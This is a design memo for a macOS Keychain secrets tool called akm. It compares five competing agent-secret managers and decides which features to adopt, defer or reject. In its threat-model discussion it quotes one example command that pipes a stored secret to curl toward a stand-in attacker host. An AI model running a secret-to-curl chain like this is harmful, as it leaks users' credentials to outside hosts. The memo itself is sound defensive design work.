# Synthesis — competitor deep-read

5 subagents read full source of: psst (215★), agentsecrets (107★), joelhooks/agent-secrets (73★), xenv (6★), lkr (16★).

Findings per repo are in the sibling `*-findings.md` files. This file is the action list.

## Adopt in v0.1.3 (high-value, low-effort)

### 1. `akm doctor` — structured health checks  (~80 lines)
Source: xenv. Returns `{checks: [{name, ok, message, fix}, ...]}` JSON. Checks: macOS `security` CLI present, `~/.akm/audit.log` exists and is 0600, optional `vercel`/`gh`/`fly` CLIs present, Keychain accessible (round-trip a probe key). Each failing check carries a `fix:` line with the exact shell command. Agents use this for self-bootstrap; humans use it when something seems off.

### 2. `akm doctor --require KEY1,KEY2,...` — pre-flight  (folds into doctor)
Source: xenv. Confirms named keys exist in the keychain. Exits 3 if any missing. Lets an agent verify a project's keys before running it.

### 3. `akm audit scan` — post-hoc leak detection  (~80 lines)
Source: xenv. Walks `git ls-files` and looks for the literal bytes of any value currently in the keychain. If a match lands, that value leaked into a tracked file — surface the path and line. Reuses our existing `Redactor` literal-match infra to share the search code. Distinct from `akm guard scan` (which scans STAGED blobs for KNOWN PREFIXES); this scans TRACKED files for ACTUAL stored values.

## Adopt later (worth tracking, bigger lift)

- **`akm call --bearer NAME --url ...`** (`agentsecrets/pkg/proxy/injector.go`) — CLI makes the authenticated HTTP call so the agent never holds the value. This is the alias-proxy pattern from our v0.1.0 brainstorm. Six injection styles: bearer, basic-auth, custom header, query param, JSON body, form. The agentsecrets implementation is full of holes (no SSRF protection, session-token auth not implemented, no CheckRedirect policy) — those are our opportunity to do it right. **Defer to v0.2.0** with a dedicated design pass on the SSRF / redirect / scheme allowlist.

- **`.akm.toml` project manifest** (`joelhooks/.secrets.json` pattern) — declares which key names a project uses; combined with `doctor --require` and `run` defaulting to manifest contents. Modest UX win — agents stop having to enumerate `--only KEY1,KEY2,...` every time. Names only, never values, so it's commit-safe. Defer to v0.1.4 unless `doctor --require` use surfaces real friction.

## Reject (with reasons)

- **MCP server** (xenv, claude-secrets). xenv needed MCP because their backing store is files-in-repo that an IDE-side agent must read/write atomically. akm's Keychain solves the same problem without an extra protocol. Our skill already covers Claude Code / Codex / Gemini natively; MCP would only add value for Cursor/Windsurf/Continue/Zed users we have no signal from. Reject.

- **Session leases + killswitch** (joelhooks). Audit theater: the daemon returns the plaintext value in the same RPC call that creates the lease, and `Revoke` only flips a `Revoked=true` bool — it cannot recall keys already in a child process's environment. No `SO_PEERCRED` check on the Unix socket either, so any same-user process can lease anything. Stronger guarantee is what akm already does: per-invocation lifecycle with no daemon. Reject.

- **Dedicated keychain DB + cdhash-bound ACL** (lkr). Layer 1 (separate `~/Library/Keychains/akm.keychain-db` outside login keychain search list) is modest gain. Layer 2 (cdhash binding via `SecAccessCreate` + `SecTrustedApplicationCreateFromPath`) is theatre against a same-user attacker — they can call `akm get` directly. lkr's own design doc admits this at `docs/design-v030.md:131-134`. The cost is ~500 lines of raw `SecKeychainItemCreateFromContent` / `SecAccessCreate` FFI plus four cdhash-related bugs in their 0.3.4 release alone. Reject.

- **TTY guard on `--raw`** (lkr). Would refuse `akm get NAME --raw` from a non-TTY caller unless they add `--force-plain`. The user explicitly accepted "hostile agent calls `akm get --raw && curl evil.com`" as an out-of-scope residual risk AND explicitly rejected any additional friction. Reject.

- **VaultBackend trait abstraction** (psst's `src/vault/backend.ts`). Premature abstraction. akm has one backend (macOS Keychain) and the user has no team / cross-platform / cloud requirement on the roadmap. Reject for now; revisit if backend pluralism actually arrives.

- **KeyKind: Admin vs Runtime separation** (lkr `crates/lkr-core/src/key.rs`). Admin keys never get injected by `run --all`; the user has to opt in per-key. Modest ergonomic improvement. Defer — not requested, complexity not justified for v0.1.3.

- **Template renderer (`lkr gen .env.tmpl`)** — the user explicitly rejected `.env`-shaped export early on: "you'll think you want it; you'll regret keeping a .env-shaped export around." Reject.

## Bugs in competitors, not in akm

Listed so we don't accidentally inherit them:

- **psst** (`src/vault/crypto.ts:19`): SHA-256(password) with no salt and no KDF as a fallback. Real crypto footgun.
- **psst** (`src/commands/init.ts:281`, `security/benchmark.sh:91`, `.claude/settings.json`): unimplemented commands referenced in shipped docs / scripts.
- **agentsecrets** (`pkg/proxy/server.go:handleProxy`): session-token auth claimed in README but never checked in code.
- **agentsecrets** (`cmd/agentsecrets/commands/root.go:132`): keychain-auth middleware short-circuits with `return nil` — claimed feature commented out.
- **agentsecrets**: no SSRF protection despite explicit claim; no `CheckRedirect` policy on forwarder.
- **agentsecrets**: Linux/WSL "keychain" fallback is base64 JSON at 0600, not encryption — directly contradicts the README's OS-keychain claim.
- **agentsecrets** (`pkg/proxy/engine.go:309-311`): `agentsecrets sync` returns hardcoded mock data.

## Honest comparison: where does akm actually sit?

After reading 5 competitors fully:

- **akm is genuinely further ahead on agent-discoverability** than psst (215★) — psst has no MCP, no agent-info manifest, no skill installer; their "AI-native" is just `--json` flags. We have all three.
- **akm's per-invocation lifecycle is materially stronger** than joelhooks/agent-secrets's persistent daemon + always-on Age key on disk.
- **akm beats xenv on backing-store choice** for the macOS-developer threat model (Keychain inheriting OS gating > AES-256-GCM file managed by the tool).
- **lkr's cdhash binding is the only competitor feature that materially improves OS-level isolation**, and our deep read says it's not worth the ~500-line FFI surface plus ongoing maintenance.

Net: we adopt `doctor` + `audit scan` for v0.1.3, document the rest, ship.
